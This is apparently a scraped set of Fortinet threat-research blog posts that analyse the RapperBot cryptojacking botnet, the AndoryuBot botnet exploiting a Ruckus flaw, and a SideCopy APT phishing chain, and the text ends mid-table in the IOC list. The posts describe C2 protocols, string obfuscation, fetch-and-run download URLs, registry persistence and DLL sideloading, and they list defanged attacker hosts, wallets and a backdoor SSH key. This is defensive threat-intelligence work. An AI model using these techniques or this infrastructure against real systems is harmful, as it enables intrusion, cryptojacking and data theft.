Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-maori"
  },
  {
    "title": "RapperBot DDoS Botnet Expands into Cryptojacking",
    "content": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical FortiGuard Labs has encountered new samples of the RapperBot campaign active since January 2023. RapperBot is a malware family primarily targeting IoT devices. It has been observed in the wild since June 2022. FortiGuard Labs reported on its previous campaigns inAugust 2022andDecember 2022. Those campaigns focused on brute-forcing devices with weak or default SSH or Telnet credentials to expand the botnet’s footprint for launchingDistributed Denial of Service(DDoS) attacks. In this campaign, these threat actors have started venturing intocryptojacking, specifically for Intel x64 machines. Initially, they deployed and executed a separate Monero cryptominer alongside the usual RapperBot binary. But in late January 2023, they combined both functionalities into a single bot. This article will discuss the changes observed in this new campaign and provide a technical analysis of the RapperBot variant upgraded with miner capabilities. We began observing the first samples of this RapperBot miner campaign in January 2023. They share some characteristics that allowed us to link this campaign to the earlier ones. The most unique and enduring trait of RapperBot samples is the YouTube URLhttps://www.youtube.com/watch?v=4fm_ZZn5qaw, which has been seen in most samples from this family. However, the string is never actually used in this campaign, unlike older samples where it prints the URL to the console at the start of execution. Another indicator of a RapperBot campaign is adding an SSH public key to~/.ssh/authorized_keysto maintain backdoor access to infected machines, even after the devices have been rebooted. This latest campaign uses the same key observed in the first campaign in June 2022 and is listed in the IOC section below. Beyond these similarities, however, we also observed some key differences, including several significant updates to the malware functionality, particularly in its C2 communication protocol. One cluster of ARM samples, suchas 7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f(Cluster A) that were delivered viahxxp://109[.]206[.]243[.]207/ssh/arm7,were very minimal in functionality. They only included three DoS attack types and no SSH brute forcing or self-propagation abilities. However, these samples included new code to collect and send information about the infected system upon registering with the C2 server. Another cluster of ARM samples delivered from the same URL, such as912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65(Cluster B), resembles the above samples but with the inclusion of the SSH brute-forcer last seen in the June 2022 campaign. Unlike that campaign, credentials are embedded in each sample and not downloaded from the C2 server. These samples propagate themselves by downloading and executing hxxp://109[.]206[.]243[.]207/d upon the successful brute force breach of a system. As in past campaigns, all samples from this campaign still encode sensitive strings with XOR encoding. But this time, the developers have opted to add an extra layer of XOR encoding, with the first layer using multi-byte XOR keys with different values and lengths for each encoded string. The second layer uses the same style of single-byte XOR encoding as in previous campaigns, with the key calculated by XORing all bytes of the first layer key (Figure 1). This additional layer of XOR encoding prevents XOR brute forcing and the easy detection of malware-related strings. The original draft was worded ambiguously, we meant to say that this campaign embedded the credentials in each sample. In the previous campaign, the credentials were downloaded from the C2 server. The structure of client requests to the Command-and-Control (C2) server has also been significantly updated. The unique 32-byte Bot ID sent with every request in previous campaigns has been removed. Instead, the request size is now variable, with random bytes generated to fill the unused parts of the request. Lastly, the request data is no longer located at fixed offsets within each request. We describe the communication protocol and request structure in more detail below. Upon execution, RapperBot connects to a hardcoded C2 server and sends a registration request (type1) containing information about the victim system (Figure 2): 1.     Hardcoded value: 0x3 0xd3 0x4a 0xb6 2.     Source: This is the first command line argument passed to the malware and usually indicates the infection vector (e.g., scan.ssh.x86_64) 3.     Local IP address 4.     UID (User identifier) 5.     Current working directory 6.     Number of processors 7.     Total memory size 8.     Open File Limit 9.     Hostname 10.  Processor model After that, it sends a keep-alive request (type3) to inform the C2 server that it is ready to receive commands. The malware then performs this request at random intervals of 60 to 600 seconds. To evade detection, the binary network protocol used to send these requests has been completely revised. Like its string encoding, it uses a two-layer approach to encode the information sent to the C2 server. The header data must first be decoded to reveal the location of the encoded information and the key needed to decode it. The size of each request is randomized, so shorter requests do not stand out in network traffic. The malware starts by generating a random number between 4 and 128, which we will refer to as RAND_VALUE, and a random XOR key for the content from 4 to 32 bytes long (referred to as KEY_SIZE). The request size is then calculated as follows: REQUEST_SIZE = RAND_VALUE + KEY_SIZE + CONTENT_SIZE + 6 The malware then generates a buffer of the same size and fills it with random bytes. The first byte of this buffer will be used as a XOR key (HEADER_KEY) for encoding the header data. The second byte will be overwritten with the RAND_VALUE XORed with the HEADER_KEY. The request data is stored at HEADER_OFFSET, RAND_VALUE / 2. The format of the structure starting at HEADER_OFFSET is as follows: All non-highlighted bytes in Figure 3 are unused padding bytes generated randomly by the malware. The Python code used to decode the content in each request with the HEADER_KEY and KEY is shown below: While we did not receive commands from the C2 server, our analysis shows that the bot supports the following commands with their corresponding IDs. The change in the C2 communication protocol is not the only major update in this campaign. Until now, RapperBot has been primarily geared toward using its victims for DDoS operations. For this campaign, however, it has started to venture into abusing the resources of infected Intel x64 machines to mine for cryptocurrency, commonly known as Cryptojacking. We observed thathxxp://109[.]206[.]243[.]207/ssh/x86_64started serving Bash shell scripts instead of the usual RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash:7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate XMRig crypto miners (example hash:0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) and RapperBot binaries, as seen in Figure 4. XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably with just consumer-grade hardware. In late Jan 2023, FortiGuard Labs collected a significantly larger x64 samplef06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa,which used the same C2 server IP and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities. Apart from executing the miner as a child process upon execution, these samples are functionally identical to those targeting ARM devices and do not have SSH brute-forcing or self-replication capabilities. Merging the bot and miner code might be an attempt to hide the mining pools and Monero wallet addresses (listed in the IOCs section) using the same double-layer XOR encoding so they are not exposed in the clear, as in the Bash script (Figure 4). The miner code also contains several modifications to facilitate cryptojacking. The ability to read external configuration files has been removed, so it always uses the configuration built into the binary itself. The bot decodes the mining pools and Monero wallet addresses and updates the hardcoded configuration before starting the embedded miner. The miner is also configured to use multiple mining pools for both redundancy and additional privacy. Two of them are mining proxies hosted on the RapperBot C2 IP itself. This allows the threat actor to omit both the wallet addresses and actual mining pools from the miner configuration. Additionally, they can change this information on the proxy server without rebuilding and deploying new bots. Aside from this, it is also configured to directly use a public mining pool, likely as a backup if the C2 IP goes offline. To prevent the termination of the miner process by the machine owner, the default signal handlers for SIGTERM, SIGUSR1, SIGINT, and SIGHUP signals have been removed. The usage information printed when executing the--helpcommand line argument has also been removed, likely to evade detection by security products and competing miners from other cryptojacking groups. Likewise, the developers also replaced “XMRig\" with “asbuasdbu\" in the version information to prevent easy identification. To maximize mining efficiency, it kills off other miners by enumerating other running processes and attempts to scan the associated binaries on disk for the following blacklisted keywords. These processes are then terminated, and the corresponding files are deleted. For example, “--algo” in the list below is part of the usage information printed by standard XMRig miners. If the binaries are not readable, it will look for blacklisted keywords within the file paths, terminate the processes, and delete the associated files. Lastly, it will terminate processes containing the blacklisted keywords in the process path or its command line arguments. Processes with path or command-line arguments containing “/zvx/” are whitelisted and never terminated. Based on the keywords used, the bot developers are more interested in terminating other miners than other IoT bots. This reaffirms their focus on cryptojacking vs DDoS attacks, at least on x64 machines. As a side note, we have not discovered an infection vector that directly delivers x64 RapperBot, as none of the RapperBot samples with an integrated miner appear to have self-propagation capabilities. This suggests the possible availability of an external loader operated by the threat actor that abuses the credentials collected by other RapperBot samples with brute forcing capabilities and infects only x64 machines with the combined bot/miner. Alternatively, the addition of the threat actor’s public SSH key in infected machines might provide another point of entry for these x64 samples. Financially motivated botnet operators are always on the lookout to extract the maximum value from machines infected by their botnets. The threat actors behind the RapperBot botnet are no exception, as evident in their addition of cryptojacking capabilities to target x64 machines. RapperBot continues to be a dangerous threat due to its continual updates to evade detection, as highlighted above. As its primary infection vector of compromising SSH services using weak or default passwords remains the same, mitigating it by enabling public key authentication or setting strong passwords for all devices connected to the internet is still effective in mitigating this threat. FortiGuard Labs will continue to monitor and report on RapperBot’s development. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors,CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Files RapperBot 7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f 912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65 f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa 6c034ff9b5447da62822e3231e5e2d5db225756b3e216f6fc469469cb1d81813 dfaffe78b8ccb03626c2f55596f977da917e8e9a00ee7576ce9eca688d88447d 95aa6882f5ea5a892ef832ef15dea77261394a7fec6db9d91267d40f1cf2bfa5 XMRig miner 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404 Bash scripts bd87ac780e574ae8415907f88a3b48af578bb269308b56826e2f33438559e4b7 3296598c79748322dfff8eb786705d048725c04b23dd3a293f52a1acafe9e7ae 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f Download URLs hxxp://109[.]206[.]243[.]207/d hxxp://109[.]206[.]243[.]207/ssh/arm4 hxxp://109[.]206[.]243[.]207/ssh/arm5 hxxp://109[.]206[.]243[.]207/ssh/arm6 hxxp://109[.]206[.]243[.]207/ssh/arm7 hxxp://109[.]206[.]243[.]207/ssh/bot hxxp://109[.]206[.]243[.]207/ssh/scan_arm4 hxxp://109[.]206[.]243[.]207/ssh/scan_arm5 hxxp://109[.]206[.]243[.]207/ssh/scan_arm6 hxxp://109[.]206[.]243[.]207/ssh/scan_arm7 hxxp://109[.]206[.]243[.]207/ssh/x86_64 hxxp://109[.]206[.]243[.]207/ssh/xmrig hxxp://171[.]22[.]136[.]15/arm4 hxxp://171[.]22[.]136[.]15/arm5 hxxp://171[.]22[.]136[.]15/arm6 hxxp://171[.]22[.]136[.]15/arm7 C2s 109[.]206[.]243[.]207 171[.]22[.]136[.]15 Mining Pools 109[.]206[.]243[.]207:31271 109[.]206[.]243[.]207:25621 pool[.]hashvault[.]pro:80 Monero Wallets 43Zs6jyniktVUNfiN8NY16TrvFKWbx3qogoRvstuquZdVA8EXvhqhz1W4hUzpjQXHAf3pDQ8UXxegFh8G26uCycKPz41ceW 47RupsxSjeHb4sHMwJ681vbjpFHAwXg6kMn1znbioqy96Qj9j2VuHrD2mXsEReELEdjRsDVKBK3Ru3diW3AgZ41Z7mzDwb4 SSH Key AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPuVqHeFYDg05KweYqTqThFFHbdxdqqrWy6fNt8q/cgI30NBa5W2LyZ4b1v6324IEJuxImARIxTc96Igaf30LUza8kbZyc3bewY6IsFUN1PjQJcJi0ubVLyWyyJ554Tv8BBfPdY4jqCr4PzaJ2Rc1JFJYUSVVT4yX2p7L6iRpW212eZmqLMSoR5a2a/tO2s1giIlb+0EHtFWc2QH7yz/ZBjnun7opIoslLVvYJ9cxMoLeLr5Ig+zny+IEA3x090xtcL62X0jea6btVnYo7UN2BARziisZze6oVuOTCBijuyvOM6ROZ6s/wl4CQAOSLDeFIP5L1paP9V1XLaYLDBAodNaUPFfTxggH3tZrnnU8Dge5/1JNa08F3WNUPM1S1x8L2HMatwc82x35jXyBSp3AMbdxMPhvyYI8v2J1PqJH8OqGTVjdWe40mD2osRgLo1EOfP/SFBTD5VEo95K2ZLQ== system key generated by server 20220709 RapperBot,cryptojacking FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/rapperbot-ddos-botnet-expands-into-cryptojacking"
  },
  {
    "title": "AndoryuBot – New Botnet Campaign Targets Ruckus Wireless Admin Remote Code Execution Vulnerability (CVE-2023-25717)",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical In April, FortiGuard Labs observed a unique botnet based on the SOCKS protocol distributed through the Ruckus vulnerability (CVE-2023-25717). This botnet, known as AndoryuBot, first appeared in February 2023. It contains DDoS attack modules for different protocols and communicates with its command-and-control server using SOCKS5 proxies. Based on our IPS signatures trigger count (Figure 1), this campaign started distributing the current version sometime after mid-April. This article details how this malware leverages the Ruckus vulnerability and examines its behavior once inside an infected device. AndoryuBot targets the Ruckus vulnerability to gain access to a device. It then downloads a script for further propagation. The complete script is shown in Figure 3, and the downloading URL is http[:]//163[.]123[.]142[.]146. The AndoryuBot variant in this analysis targets the following architectures: arm, m68k, mips, mpsl, sh4, spc, and x86. It is saved under the filename “Andoryu,” which is how the campaign name was derived. It also uses its downloading method, “curl”, as its file extension. In addition, although it has “.ppc” in the script, instead of a valid execution file, the link only contains the string “Invalid file bixxh axx boi”. AndoryuBot first checks the argument count—the assembly code is shown in Figure 4. Take the x86 file as an example: the original parameters are “Andoryu.10curl” and “ruckus”. It then decodes data from the “.rodata” section. Figure 5 shows part of the code. The encryption key, “0x2A41605D“, and the clear text are shown in Figure 6. After the execution, it prints the string, “Project Andoryu(12/30/2022). What color is your botnet !” in the console. Analysis indicates that this project began last year, which makes this quite a new botnet group. After initialization, AndoryuBot sends a GET request to extract the victim’s public IP address. The HTTP request to “api.ipify.org” has a hardcoded User-Agent string, shown in Figure 7. Then it starts a connection to its C2 server, 45[.]153[.]243[.]39[:]10333, using the SOCKS protocol. The code is shown in Figure 8. The first data sent from the compromised endpoint is shown in Figure 9. After its communication channel setup, the client waits for a command from the server to launch a DDoS attack. The functions are shown in Figure 10. AndoryuBot includes 12 methods: tcp-raw, tcp-socket, tcp-cnc, tcp-handshake, udp-plain, udp-game, udp-ovh, udp-raw, udp-vse, udp-dstat, udp-bypass, and icmp-echo. We can locate these from the decoded data in the previous section. Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of the DDoS attack traffic is shown below: Based on the above features from AndoryuBot, we found a YouTube video published on April 25 that gives a brief induction about “Andoryu Net”. The description of its attack methods found on its selling page in Telegram is shown in Figure 12. The names match the decoded data from the AndoryuBot sample we collected. The Andoryu project will likely continue to update its features to increase interest and sales. CVE-2023-25717 is a remote code execution vulnerability affecting multiple Ruckus wireless Access Point (AP) devices (FortiGuard Labs released athreat signal reportabout CVE-2023-25717 on April 28). Once a target device is compromised, AndoryuBot quickly spreads and begins communicating with its C2 server via the SOCKS protocol. In a very short time, it is updated with additional DDoS methods and awaits attack commands. Users should be aware of this new threat and actively apply patches on affected devices as soon as they become available. This malware is detected and blocked by FortiGuard Antivirus as: ELF/Andoryu.CBN!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. C2: 163[.]123[.]142[.]146 45[.]153[.]243[.]39 Files: ea064dd91d8d9e6036e99f5348e078c43f99fdf98500614bffb736c4b0fff408 f42c6cea4c47bf0cbef666a8052633ab85ab6ac5b99b7e31faa1e198c4dd1ee1 3441e88c80e82b933bb09e660d229d74f7b753a188700fe018e74c2db7b2aaa0 3c9998b8451022beee346f1afe18cab84e867b43c14ba9c7f04e5c559bfc4c3a b71b4f478479505f1bfb43663b4a4666ec98cd324acb16892ecb876ade5ca6f9 e740a0d2e42c09e912c43ecdc4dcbd8e92896ac3f725830d16aaa3eddf07fd5c 4fe4cff875ef7f8c29c95efe71b92ed31ed9f61eb8dfad448259295bd1080aca 2e7136f760f04b1ed7033251a14fef1be1e82ddcbff44dae30db12fe52e0a78a 1298da097b1c5bdce63f580e14e2c1b372c409476747356a8e9cfaf62b94513d 55e921a196c92c659305aa9de3edf6297803b60012f83967562a57547875fec1 vulnerabilities,botnet,linux FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/andoryubot-new-botnet-campaign-targets-ruckus-wireless-admin-remote-code-execution-vulnerability-cve-2023-25717"
  },
  {
    "title": "Clean Rooms, Nuclear Missiles, and SideCopy, Oh My!",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Controls victim’s machine and collects sensitive informationSeverity Level:Medium Occasionally, FortiGuard Labs researchers come across a file name or e-mail subject that makes us sit up and take notice. Of course, it may turn out to be nothing. But every once in a while, one of these turns out to be incredibly interesting. We recently came across one such file that referenced an Indian state military research organization and an in-development nuclear missile. The file was meant to deploy malware with characteristics matching the APT group “SideCopy.” With activities dating back to at least 2019, this group has aligned its targeting with the goals and objectives of the Pakistani government. The SideCopy APT group is known to leverage similar TTPs (Tactics, Techniques, and Procedures)—and in some cases, utilizes the same infrastructures—as another Pakistan-based threat actor group known as “Transparent Tribe.” Some reports even claim that SideCopy is a subsidiary of Transparent Tribe. The group was allegedly named “SideCopy” because an infection chain they employed was copied from the long-time Indian threat actor group SideWinder in a likely attempt to make attribution more difficult. Although SideCopy primarily targets Windows platforms, some reports indicate they have deployed malware to compromised Mac and Linux machines. The initial infection vector is suspected to be a phishing e-mail. However, that information was not available to FortiGuard Labs at the time of our investigation. That said, we do have access to a Zip file that would have been the likely attachment to an e-mail. The file is named “DRDO-K4-Missile-Clean-room.zip”. When the name’s meaning is fully parsed, it becomes quite interesting. “DRDO” refers to India’s Defence Research and Development Organisation (https://en.wikipedia.org/wiki/Defence_Research_and_Development_Organisation). “K-4” refers to the intermediate-range SLBMs (Submarine-Launched Ballistic Missiles) housed in their Arihant class of nuclear-powered ballistic missile submarines (https://en.wikipedia.org/wiki/K-4_(missile)). And “clean room” refers to the facility required to assemble sensitive components or perform intensive maintenance on these missiles. The Zip file contains three files, with two of them meant to be deployed in a subdirectory of the extraction location. The “office.template.mac” and “office.template.ui” files appear to contain unformatted data and have no bearing on the infection chain. They seem to function as decoys to make the third file, “DRDO-K4 Missile Clean room.pptx.lnk”, appear more legitimate. This is a Microsoft Windows shortcut file. On any Windows system with file extensions hidden, the “.lnk” extension would not be visible, making it appear as “DRDO-K4 Missile Clean room.pptx”. This deception makes it more difficult to distinguish the file as malicious simply by looking at it. The Windows shortcut file does not open a PowerPoint file (at least immediately). Instead, it reaches out to a domain controlled by the attacker using the utility for Microsoft HTML Applications (HTAs), or “mshta.exe”. In this case, the command line argument points to a URL. At the other end of the URL is a malicious file, “Pantomime.hta”, that will be downloaded and executed: hXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]hta. Previous SideCopy incidents have been observed to useCACTUSTORCHto deploy code in an obfuscated manner via JavaScript and VBScript. This campaign appears to differ because the payload here seems to have been created using a tool called SILENTTRINITY. SILENTTRINITYis a newer, more comprehensive tool that can be used as a fully featured post-exploitation framework in the same vein as Empire or CobaltStrike. It effectively allows the execution of Microsoft .Net code without using PowerShell as an intermediary step. In this case, it appears that the payload was generated using the tool. However, it is unknown whether the backend that served this file or its subsequent stages used it. “Pantomime.hta” contains several sections of note. The head of the file validates the .Net version installed on the victim machine and verifies whether the folder “C:\\ProgramData\\HP” is present. If not, it will create it. Most of the rest of the file is dominated by two encoded sections stored in variables “dividAndRule” and “punctureTyres”. Both are base 64 encoded, albeit in slightly different ways. It’s helpful to start with the second section first, as it has to be read first for the code to be executed properly. As Figure 6 shows, “punctureTyres” is passed to the function “basforsixfourstream” (as shown in Figure 5), which decodes it from base64. The newly decoded “punctureTyres” is deserialized (read into a memory stream), where it can be executed. Contained within this stream is a Microsoft .Net library named “hta.dll”. It includes a function called “RealityShow” that is used to pass the base64-encoded variable “dividAndRule” so the file “DRDO-K4 Missile Clean room.pptx” can be deployed as well as the next stage of the malware. As mentioned, “hta.dll” aims to deploy “DRDO-K4 Missile Clean room.pptx”. It can be deployed as well as the next stage of the malware. After being called from “Pantomime.hta”, the function “openthefile” takes the data from “dividAndRule”, decodes it from base64, and decompresses it due to it being a GZip compressed data stream. It then opens the file for display. Additionally, the function “getThirdStrike” is called to begin the next phase of infection. “getThirdStrike” establishes the download location for what will become the file “jquery.hta”. It then sends that on the function “runItOn” to reach out to “hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery.txt” to download the file. “getThirdStrike” also assesses the antivirus situation on the victim machine and passes that information on via an HTTP POST through the “pkg.infinity” function, which will reach out to “hXXp://cornerstonebeverly.org/js/files/ntfonts/avena/”. Once all of this occurs, the execution of “jquery.hta” commences. Unlike the shortcut that shares its name, this is an actual Microsoft PowerPoint file. The PowerPoint deck contains 22 slides and is a convincing treatise on the requirements for building a cleanroom environment to suit the needs of a major aerospace project in that region of the globe. The file, however, is entirely benign and operates as a decoy to conceal other activities being undertaken. “jquery.hta” is very similar in structure and purpose to “Pantomime.hta”. It advances the infection by deploying additional files from multiple variables with encoded data. It seems to have also been created by SILENTTRINITY. The head of the file contains the function “decode_base64”, a custom implementation to decode base 64-encoded data that will be used later and a large, encoded section attached to a variable called “addle”. Like “Pantomime.hta”, this gets executed once the next section is decoded and executed. The variable “InMomemerandum” contains the base64-encoded data for another .Net DLL called “PreBot.dll”. The function “decode_base64” from Figure 12 is now being used to decode a small block of base64 text, “U2VsZWN0ICogRnJvbSBBbnRpVmlydXNQcm9kdWN0”. This translates to “Select * From AntiVirusProduct”, a Windows Management Instrumentation (WMI) query to obtain information on what type of antivirus product(s) may be installed on the system. Figure 14 shows that “InMomemerandum” will be sent to a function to decode it from base 64—in this case, the function “bazSixFerToStreeeemStranger”. It is then deserialized to run “PreBot.dll” in memory, after which point the data from the variable “addle” is passed to the function “PinkAgain”. The opening class declaration of “DraftingPad” contains the path destinations for the files remaining to be deployed for this attack. In addition to containing the desired landing locations for the remaining files, some additional base 64 encoded text is assigned to the variable “BatFileBytes”. The “PinkAgain” function takes the data passed from “jquery.hta” in the form of a base 64-encoded, GZip-compressed stream of bytes and the antivirus settings of the victim machine and route them to a function that will deal with them appropriately. The purpose of “test.bat” is to create a registry key called “Windows Update Schedule” in the “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” registry hive. The naming convention attempts to assist it in blending in as something that looks legitimate. This ensures that the file “C:\\Users\\Public\\hp\\cridviz.exe” is executed upon each system restart. Finally, “DUser.dll” is decompressed and deposited into its target location of “C:\\Users\\Public\\hp\\” alongside “cridviz.exe”. This contains the main code for a Remote Access Trojan (RAT) that will be used along with the aforementioned “credviz.exe” by having its code sideloaded (https://attack.mitre.org/techniques/T1574/002/) into it when it launches. The file “C:\\Users\\Public\\hp\\cridviz.exe” is copied from its usual location at either “C:\\Windows\\SysWOW64\\credwiz.exe” or “C:\\Windows\\System32\\credwiz.exe” (depending on the system’s architecture) to the above location with the filename slightly altered. “cridviz.exe” is the \"Credential Backup and Restore Wizard\" used as part of the Windows Credential Manager to provide a method for backing up and restoring saved credentials on the system. As mentioned previously, the SideCopy RAT doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. In this case, it’s “cridviz.exe”. It uses sideloading to do this, which is to say that a dependency of the legitimate application is highjacked to allow the malicious code to load. This is done by dropping the malicious DLL “DUser.dll” in the directory with “cridviz.exe”. Interestingly, “DUser.dll” isn’t a direct dependency requirement. It is actually a requirement of two other libraries that “cridviz.exe” requires, “COMCTL32.dll” and “SHELL32.dll”. The result of doing this is that it makes tracing the source of the malicious code much more difficult. The end state for this attack is the deployment and execution of “DUser.dll”. As alluded to above, a legitimate version of this file normally resides in “C:\\Windows\\SysWOW64”. As shown in Figure 23, comparing the illegitimate and legitimate files indicates several differences. Notably, what’s available in the “File description” and “File version” fields, as well as the size of the files, with the malicious one being considerably smaller. Upon execution, “DUser.dll” reaches out to “hXXp://144[.]91[.]72[.]17:8080” as a command and control (C2) node to both send and receive to. The actions performed by the RAT use a distinctive user-agent string, “cpp-httplib/0.7”, making it stand out in traffic. It can communicate over TCP using raw sockets or via HTTP. The RAT can also perform other, less common HTTP verb-related operations, such as “PUT” and “PATCH”. The RAT can start other processes if instructed using the “CreateProcessW” Windows API call. This would be useful for launching additional payloads once a foothold on the target system has been achieved. A targeted campaign, where the attacker takes the time to create a lure relevant enough for a target to pursue, will always open more doors for an attacker. In this case, we saw SideCopy deliver one that would be of interest only to a small group of people in the Indian defense industry. Targets in this position would be of definite interest to the Government of Pakistan and any threat actors that align with its aims. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. File-based IOCs: Filename SHA256 DRDO-K4-Missile-Clean-room.zip 9aed0c5a047959ef38ec0555ccb647688c67557a6f8f60f691ab0ec096833cce office.template.mac bf34077c8b22759b28dcc458dc1b7bba3810c1c30b050b26a26e8d9f64e77971 office.template.ui c7753ffb7f66b0dfb05a24955324182cb92bbf41dd8fccb308c3f04d497a16da DRDO - K4 Missile Clean room.pptx.lnk a2e55cbd385971904abf619404be7ee8078ce9e3e46226d4d86d96ff31f6bb9a pantomime.hta e88835e21c431d00a9b465d2e8bed746b6369892e33be10bc7ebbda6e8185819 hta.dll 68ec4461653ae682eeace1bff583307ec521a3ee23873a991c031cc49dc8132f DRDO - K4 Missile Clean room.pptx b9514ed1566c8ce46ab5bfd665f8b997f2d5624740f298699df43bb108e08c4d jquery.hta 85faf414ed0ba9c58b9e7d4dc7388ba5597598c93b701d367d8382717fb485ec PreBot.dll 1c2399674713d2a3fc19b841e979eed61d73d1b7ca8fd6f29ba95a41f5a7684d test.bat f0cc9b18ba32f95085d5f9a3539dc08832c19e7d3124a5febbdc3bae47deab24 cridviz.exe 17eabfb88a164aa95731f198bd69a7285cc7f64acd7c289062cd3979a4a2f5bf DUser.dll 865e041b41b9c370a4eed91a9a407bd44a94e16e236e07be05e87de319a4486c Network-based IOCs: IOC IOC type cornerstonebeverly[.]org TLD for HTA file downloads hXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]hta Further payload download 